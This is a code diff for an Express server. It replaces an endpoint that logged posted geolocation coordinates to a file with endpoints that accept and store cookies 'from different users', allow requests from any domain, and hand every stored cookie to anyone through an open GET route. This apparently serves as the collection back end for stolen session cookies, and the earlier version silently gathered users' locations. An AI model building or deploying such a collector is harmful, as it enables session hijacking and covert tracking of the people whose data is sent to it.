@@ -1,23 +1,26 @@
+// server.js
 const express = require('express');
-const fs = require('fs');
 const app = express();
-const port = 3000;
+const bodyParser = require('body-parser');
+const cors = require('cors');
 
-app.use(express.json());
+app.use(cors()); // Для разрешения запросов с других доменов
+app.use(bodyParser.json());
 
-app.post('/save-location', (req, res) => {
-    const { latitude, longitude } = req.body;
-    const data = `Latitude: ${latitude}, Longitude: ${longitude}\n`;
+let userCookies = []; // Хранение куки от разных пользователей
 
-    fs.appendFile('locations.txt', data, (err) => {
-        if (err) {
-            res.status(500).send('Error writing to file');
-            return;
-        }
-        res.status(200).send('Location saved');
-    });
+app.post('/api/store-cookies', (req, res) => {
+    const { cookies } = req.body;
+    // Сохраняем куки в массиве (в реальном приложении используйте базу данных)
+    userCookies.push(cookies);
+    console.log('Cookies stored:', cookies);
+    res.json({ status: 'success' });
 });
 
-app.listen(port, () => {
-    console.log(`Server listening at http://localhost:${port}`);
+app.get('/api/get-cookies', (req, res) => {
+    res.json(userCookies);
+});
+
+app.listen(3000, () => {
+    console.log('Server is running on port 3000');
 });
